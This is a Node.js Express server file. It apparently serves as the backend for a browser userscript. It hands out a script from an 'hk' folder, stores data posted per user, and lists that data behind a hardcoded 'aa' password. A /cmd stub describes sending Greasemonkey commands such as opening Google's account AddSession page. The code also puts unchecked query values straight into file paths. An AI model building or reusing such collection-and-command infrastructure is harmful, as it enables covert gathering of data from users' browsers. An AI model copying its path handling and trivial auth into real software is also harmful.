import express from "express";
import {
  text as textParser
  //  json as jsonParser,
  //  urlencoded as urlParser
} from "body-parser";
import {
  readFileSync,
  writeFileSync,
  writeFile,
  readdirSync,
  existsSync,
  mkdirSync
} from "fs";

const dev = process.env.NODE_ENV === "development";
const app = express();

app.use(textParser());
//app.use(jsonParser());
//app.use(urlParser({ extended: true }));

app.get("/", (req, res) => {
  let user = req.query.user,
    hash = req.query.hash;
  let content = readFileSync("./hk/index.js");
  //console.log({ content });
  res.send(content.toString());
});

app.post("/action", (req, res) => {
  if (!existsSync("./data")) mkdirSync("./data");
  console.log(
    `user: ${req.query.user}`,
    `data: ${existsSync("./data")}`,
    `file: ${existsSync(`./data/${req.query.user}.json`)}`
  );
  let file = `./data/${req.query.user}.json`;

  let data;
  try {
    data = JSON.parse(readFileSync(file).toString());
  } catch {
    data = [];
  }
  data.push(JSON.parse(req.body));

  writeFileSync(file, JSON.stringify(data));
  res.json({ ok: true });
  /*writeFile(`./data/${req.query.user}.txt`, `${req.body}\r\n==\r\n`, error => {
    if (error) res.json({ ok: false, error });
    else res.json({ ok: true });
  });*/
});

app.get("/read", (req, res) => {
  if (req.query.auth != "aa") res.end("auth error");
  else if (req.query.file) {
    let file = `./data/${req.query.file}.json`;
    if (existsSync(file)) res.send(readFileSync(file));
    res.send(`file not exists! ${file}`);
  } else {
    console.log(`data: ${existsSync("./data")}`);
    let result = "";
    if (!existsSync("./data")) result = "No data";
    else
      readdirSync("./data").forEach(file => {
        let fileName = file.replace(".json", "");
        result += `<a href="/read?auth=${req.query.auth}&file=${fileName}">${fileName}</a><br />`;
      });
    res.send(result);
  }
});

app.get("/delete", (req, res) => {});

app.get("/cmd", (req, res) => {
  /*
   use `GM` constant to access GM scope. (ex: let info = GM.getInfo();)
  ex:
  google_8720: function() {
    GM.GM_openInTab("https://accounts.google.com/AddSession")
  }
  */
  let user = req.query.user,
    hash = req.query.hash;
  res.json({});
});

let PORT = process.env.PORT || 4200;
app
  .listen(PORT, () => {
    console.log(`Node Express server listening on port:${PORT}`);
  })
  .on("error", error =>
    console.error("[server] express error:", { port: PORT, error })
  );
